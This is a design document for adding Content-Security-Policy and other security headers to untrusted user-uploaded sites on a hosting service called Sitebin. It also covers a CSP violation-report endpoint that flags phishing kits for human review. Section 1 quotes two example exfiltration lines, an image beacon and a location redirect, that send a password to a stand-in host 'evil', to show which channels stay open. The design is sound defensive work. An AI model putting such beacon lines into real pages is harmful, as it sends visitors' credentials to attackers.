# Security Headers for Untrusted Content — Design

Date: 2026-08-27 · Status: Approved for implementation

Sitebin serves arbitrary uploaded HTML from origins it controls, today with **no
security headers at all** — not `nosniff`, not a CSP, nothing. Phishing kits have
started using anonymous drops on app.sitebin.io: a credential form that renders a
brand's login page and ships what it captures to a third party.

This adds two layers of response headers, and a CSP report endpoint whose
violations become the abuse signal.

The goal is deliberately narrow: **stop the exfiltration, not the rendering.**
Blocking remote scripts and images would kill the phishing kit outright, but it
would equally kill every legitimate site that loads React or Tailwind from a
CDN — which is a large part of what Sitebin is for.

## 1. Two layers

Multiple `Content-Security-Policy` response headers **intersect**: each is
enforced independently, so a second header can only narrow the first. That is
the mechanism here, and it is also why an uploaded page cannot loosen anything
with a `<meta>` policy of its own.

**Baseline — every site, both editions.** Hygiene that breaks nothing:

```
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=(), midi=()
Content-Security-Policy: object-src 'none'; base-uri 'self'
```

`base-uri` is `'self'`, not `'none'`: Angular and other frameworks ship
`<base href="/">` as a matter of course, and `'none'` forbids the element
outright. `'self'` still stops a `<base>` that redirects every relative URL to
an attacker's host.

**Strict — untrusted sites only.** A second CSP header, plus a tighter
referrer policy:

```
Content-Security-Policy: form-action 'none'; connect-src 'self'; frame-ancestors 'none'; frame-src 'none'; report-uri /_sitebin/csp-report; report-to csp
Referrer-Policy: no-referrer
Reporting-Endpoints: csp="/_sitebin/csp-report"
```

- `form-action 'none'` — the classic credential POST to a third party.
  `connect-src` does **not** cover form submissions, which is why this is its own
  directive and why omitting it would leave `<form action="https://…">` wide open.
- `connect-src 'self'` — `fetch`, `XHR`, `sendBeacon`, WebSocket, EventSource.
  This is what the observed kit used (an EmailJS call).
- `frame-ancestors 'none'` / `frame-src 'none'` — the site cannot be framed, and
  cannot frame anything.

**What this deliberately does not stop.** Scripts and images still load from
anywhere, because that is the trade this design accepted. Two exfiltration
channels survive it:

- an image beacon, `new Image().src = "https://evil/?p=" + password`;
- top-level navigation, `location = "https://evil/?p=" + password`. CSP has no
  answer for this at all — `navigate-to` was dropped from the standard and is
  implemented nowhere. Only `sandbox` without `allow-top-navigation` closes it,
  at the cost of breaking every external link.

Both are out of scope. The measure raises the cost of the common kit and, more
importantly, makes the attempt visible (§4).

## 2. Which sites are untrusted

`eeconfig.Tier` gains `trusted bool`. A site is trusted when the tier that
granted it says so; anonymous sites never are.

The decision reaches the core through `ext.CreateGrant`, which already carries
the caps: it gains `Trusted bool`. The core writes a marker file,
`files/.sitebin-trusted`, for a trusted site and removes it otherwise — at the
two moments quotas are already stamped: site creation, and `ApplyQuota` (the
tier-change restamp). The cleanup sweep, which walks every site anyway,
reconciles a missing or stale marker as a safety net.

**The polarity matters more than it looks.** The marker marks *trust*, not
hardening, so its absence hardens. A marker that was never written, was lost in
a restore, or was not updated on a tier change yields a site served more
strictly than intended — an annoyance. The opposite polarity would yield a
phishing site served without protection. A security control's failure has to
fall on the safe side.

**The community build stays fully open.** It registers no provider, so
`AuthorizeCreate` is never called and there is no grant. The core therefore
treats "no provider" as trusted and writes the marker for every site. No
configuration, no gate, no behaviour change for self-hosters — exactly as
`gatedAnonymous` already does for WebDAV and FTP.

The marker is hidden from `file_server` (both serving and directory listing) and
skipped by `store.ListFiles`, the same way `.sitebin-spa` already is.

## 3. Where the headers come from

Caddy. The backend cannot contribute response headers here: `forward_auth`'s
`copy_headers` copies from the auth *response* into the *request* going
upstream, and the upstream is `file_server`, not a proxy. Routing content
through Go instead would put every byte of every site on the Go path — the
opposite of what the architecture is built for.

`writeContentRoutes` and `writePathViewRoutes` gain, inside their existing
`route`/`handle` blocks and after `root` is set (the `file` matcher resolves
against the root):

```
header { …baseline… }
@untrusted not file /.sitebin-trusted
header @untrusted { …strict… }
```

`header` does not terminate a route, so serving continues to the existing SPA /
file_server handling untouched.

## 4. Violation reporting

`POST /_sitebin/csp-report` — public and unauthenticated by necessity, since the
browser sends it. It sits under `/_sitebin/*`, which Caddy already routes
straight to the backend, bypassing `forward_auth`; a report about a gated site
still has to arrive.

The site is resolved from the request's Host, exactly as `authz` does. Reports
for an unknown host are dropped.

**Aggregated in memory, flushed on a timer.** A hostile page can call the
endpoint in a loop; writing a file per report would be a denial-of-service
against the disk. What matters for detection is not the count but the
destination: "this site tried to reach `api.emailjs.com`". So the backend keeps,
per site, a **capped set of at most 20 distinct blocked URIs** plus a total
count, and flushes to the site's existing `stats.json` at most once a minute.
Beyond the cap, new destinations are dropped and only the counter moves. Bodies
larger than 8 KB are rejected unread.

`stats.json` gains `csp_violations int` and `csp_blocked []string`. It is
already written atomically under the per-site lock by `RecordView`; this reuses
that path. `meta.json` — the site's configuration — is not touched.

## 5. Surfacing it

`ext.SiteInfo` gains `Violations int` and `Blocked []string`. The instance
register (`/account/admin`) gains a **Flags** column showing the violation count
for sites that have any, a filter for "has violations", and the blocked
destinations on the row. A site whose first visitor trips `form-action` against
a foreign host is almost always phishing, and the register is where an operator
already goes to delete it.

The figures strip gains one more number: how many sites have violations.

## 6. Tests

`internal/caddygen`: the baseline header block appears on every content origin;
the strict block is emitted with a `not file` matcher; the marker name matches
`store`'s constant (the existing SPA-marker assertion pattern).

`internal/store`: the trusted marker is written and removed; `ListFiles` skips
it; `RecordCSPViolation` caps distinct URIs at 20, counts beyond the cap, and
survives a missing `stats.json`.

`internal/httpapi`: the report endpoint resolves a site by Host, rejects an
unknown host, rejects an oversized body, and records the blocked URI; a trusted
grant writes the marker at creation and `ApplyQuota` removes it when the tier
stops being trusted; a site created with no provider registered (community) is
trusted.

`ee`: a tier with `"trusted": true` produces a trusted grant and one without does
not; the admin register shows the violation count and the filter selects only
sites that have violations.

## 7. Out of scope

- `sandbox`, and therefore top-level-navigation exfiltration (§1).
- Restricting `script-src` or `img-src` (§1).
- Serving user content from a separate registrable domain, and the Public Suffix
  List entry that would go with it. That is the right long-term move and it is
  organisational, not a code change.
- Automatic suspension on violations. The register reports; a human deletes.
- Any hardening in the community build.
